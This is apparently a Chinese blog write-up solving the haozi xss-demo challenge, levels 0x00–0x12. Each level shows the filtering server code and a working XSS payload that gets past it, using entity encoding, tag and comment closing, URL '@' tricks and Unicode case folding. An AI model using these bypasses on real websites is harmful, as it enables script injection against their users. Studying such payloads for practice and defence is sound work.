---
layout: post
title: haozi xss-demo 在线做题笔记
comments: false
description: ""
keywords: "Vulnerability"
---

一款在线xss题目，haozi师傅开发，页面很舒服，很喜欢；

目的：弹出alert(1);即可

项目：[https://github.com/haozi/xss-demo](https://github.com/haozi/xss-demo)

地址：[https://xss.haozi.me](https://xss.haozi.me)

自带alert(1)的js地址：[https://xss.haozi.me/j.js](https://xss.haozi.me/j.js)

## 0x00

server code:

```
function render (input) {
  return '<div>' + input + '</div>'
}
```

Analysis:

```
没过滤，直接输出在div标签中；
```

input code:

```
<img src=x onerror="alert(1)">
```

html:

```
<div><img src=x onerror="alert(1)"></div>
```

## 0x01

server code:

```
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

Analysis:

```
没过滤，闭合<textarea>标签；
```

input code:

```
</textarea><script>alert(1)</script>
```

html:

```
<textarea></textarea><script>alert(1)</script></textarea>
```

## 0x02

server code:

```
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

Analysis:

```
没过滤，闭合"双引号及input标签；
```

input code:

```
"><img/src=x onerror=alert(1)>
```

html:

```
<input type="name" value=""><img/src=x onerror=alert(1)>">
```

## 0x03

server code:

```
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Analysis:

```
正则匹配了()括号，并将其替换为空；
1、html实体编码绕过；
2、模版字符串；
```

input code:

```
1、<img src=x onerror="alert&#x28;1&#x29;">
2、<img src=x onerror="alert`1`">
```

html:

```
1、<img src=x onerror="alert&#x28;1&#x29;">
2、<img src=x onerror="alert`1`">
```

## 0x04

server code:

```
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

Analysis:

```
在上题基础上加了个``反引号过滤；
html实体编码绕过；
```

input code:

```
<img src=x onerror="alert&#x28;1&#x29;">
```

html:

```
<img src=x onerror="alert&#x28;1&#x29;">
```

## 0x05

server code:

```
function render (input) {
  input = input.replace(/-->/g, '笑脸')
  return '<!-- ' + input + ' -->'
}
```

Analysis:

```
将html的-->注释符替换成笑脸...并且输出在html注释中；
使用--!>绕过并跳出注释；
html注释：<!--xxx-->或者<!--xxx!-->
```

input code:

```
--!><svg/onload=alert(1)>
```

html:

```
<!-- --!><svg/onload=alert(1)> -->
```

## 0x06

server code:

```
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

Analysis:

```
过滤以auto开头或者on开头，=等号结尾的标签属性并替换成_，且忽略大小写；
换行绕过；
```

input code:

```
onmousemove
=alert(1)
```

html:

```
<input value=1 onmousemove
=alert(1) type="text">
```

## 0x07

server code:

```
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

Analysis:

```
正则匹配了<开头，>结尾的标签字符串，且忽略大小写，并将其替换成空；
利用浏览器容错性，去掉>闭合绕过；
```

input code:

```
1、<svg/onload='alert(1)'
2、<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;
```

html:

```
<article><img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;</article>
```

## 0x08

server code:

```
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

Analysis:

```
将</style>标签替换成/* \u574F\u4EBA */，忽略大小写；
1、在标签>闭合前加空格绕过；
2、在标签>闭合前换行绕过；
```

input code:

```
1、</style ><script>alert(1)</script
2、</style
><script>alert(1)</script>
```

html:

```
<style>
      </style
><script>alert(1)</script>
    </style>
```

## 0x09

server code:

```
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

Analysis:

```
正则匹配以https://www.segmentfault.com开头的输入，若无匹配返回失败；
输出正则匹配字符，闭合script标签，注释掉最后的">来绕过；
```

input code:

```
https://www.segmentfault.com"></script><script>alert(1)</script>//
```

html:

```
<script src="https://www.segmentfault.com"></script><script>alert(1)</script>//"></script>
```

## 0x0A

server code:

```
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

Analysis:

```
同上一题的基础上加了许多过滤；
输入点在<script>标签的src属性中，可以直接引入远端js文件绕过；
alert(1)的js官方提供地址：https://xss.haozi.me/j.js
利用URL的@特性引入js，过滤后的html实体编码在html标签属性值中无影响，直接解析；
```

input code:

```
https://www.segmentfault.com@xss.haozi.me/j.js
```

html:

```
<script src="https:&#x2f&#x2fwww.segmentfault.com@xss.haozi.me&#x2fj.js"></script>
```

## 0x0B

server code:

```
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

Analysis:

```
将输入全部大写；
1、html标签大小写无影响，可以直接引入外部js文件绕过；
2、js严格区分大小写，但在html标签内可以使用html实体编码绕过；
```

input code:

```
1、<script src="https://xss.haozi.me/j.js"></script>
2、<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
```

html:

```
1、<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
2、<h1><IMG SRC=X ONERROR=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;></h1>
```

## 0x0C

server code:

```
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

Analysis:

```
同上题的基础上过滤了script标签，忽略大小写且替换为空；
由于只过滤一次，可以直接在script中插入script绕过；
当然也可以采用html实体编码绕过；
```

input code:

```
<scscriptript src="https://xss.haozi.me/j.js"></scscriptript>
```

html:

```
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

## 0x0D

server code:

```
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

Analysis:

```
正则匹配</"'号，且替换为空，同时输入点在//注释后；
由于输入点在script标签内，完全可以直接alert，使用换行绕过//注释行，弹窗后换行再行注释')；
由于过滤了/，即//和/**/的js注释失效，可以使用html注释-->闭合绕过；
```

input code:

```

alert(1);
-->
```

html:

```
<script>
          // alert('
alert(1);
-->')
    </script>
```

## 0x0E

server code:

```
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

Analysis:

```
正则匹配<开头的字符串，替换为<_字母，且将输入全部大写；
由于匹配了<+字母，即所有标签全部gg，并别提之后的绕过大写，这里查资料发现字符ſ大写后为S（ſ不等于s）；
```

input code:

```
<ſcript src="https://xss.haozi.me/j.js"></script>
```

html:

```
<h1><SCRIPT SRC="HTTPS://XSS.HAOZI.ME/J.JS"></SCRIPT></h1>
```

## 0x0F

server code:

```
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

Analysis:

```
将一些字符进行实体编码，输入点在console.error中；
由于题目使用的是img标签，所有输入在标签内，而过滤的又将其转为html实体编码，所以无影响...
闭合'单引号和)括号，在img中的onerror属性中alert；
```

input code:

```
');alert('1
```

html:

```
<img src onerror="console.error('&#39;);alert(&#39;1')">
```

## 0x10

server code:

```
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

Analysis:

```
没意义，闭合输出；
```

input code:

```
'1';alert(1)
```

html:

```
<script>
  window.data = '1';alert(1)
</script>
```

## 0x11

server code:

```
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

Analysis:

```
过滤一些字符；
输入点在自定义参数的字符串值中，/替换为//，但"双引号过滤后的/"正好将/引入在内，过滤形同虚设...
```

input code:

```
"),alert(1)//
```

html:

```
<script>
  var url = 'javascript:console.log("\"),alert(1)\/\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
```

## 0x12

server code:

```
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

Analysis:

```
匹配"双引号，并替换为\\"；
由于输入点在script标签外，则不能考虑html实体编码；
"替换成\\"，在实际输出中可以在添一个\来转义掉第一个\绕过；
```

input code:

```
\");alert(1);//
```

html:

```
<script>console.log("\\");alert(1);//");</script>
```

## BTW

多数题目考察绕过正则匹配的过滤，有些感觉是为了题而出题，实用性不大，但页面做的很有趣，很舒服，还是推荐大家来玩，膜haozi师傅。